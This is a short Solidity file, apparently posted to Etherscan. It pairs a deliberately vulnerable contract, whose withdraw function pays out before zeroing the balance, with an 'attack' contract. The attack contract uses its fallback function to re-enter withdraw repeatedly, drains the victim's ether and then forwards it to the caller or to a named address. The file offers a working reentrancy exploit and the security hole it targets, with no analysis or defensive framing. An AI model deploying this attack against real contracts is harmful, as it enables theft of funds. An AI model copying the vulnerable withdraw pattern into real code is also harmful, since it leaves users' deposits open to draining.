/**
 *Submitted for verification at Etherscan.io on 2021-04-29
*/

pragma solidity ^0.5.0;

contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract attack{
    
    Vuln public vuln;
    uint count= 0;
    
   constructor(address x) public{
        vuln=Vuln(x);
    }
    function get_money() public payable {
        vuln.deposit.value(msg.value)();
        vuln.withdraw();
       
    }
    function() external payable{
        if(count++ < 6){
            vuln.withdraw();
        }
        count=0;
    }
    function getBalance() public view returns (uint){
       return address(this).balance;
    }//change msg.sender to (0x57d4455Fa042B0969B2cA7f176227A419AE3e1c2) if you want the money to be transfered to the owner 
   function transf_to_user() public payable{
        msg.sender.transfer(address(this).balance);
   }
   
    
}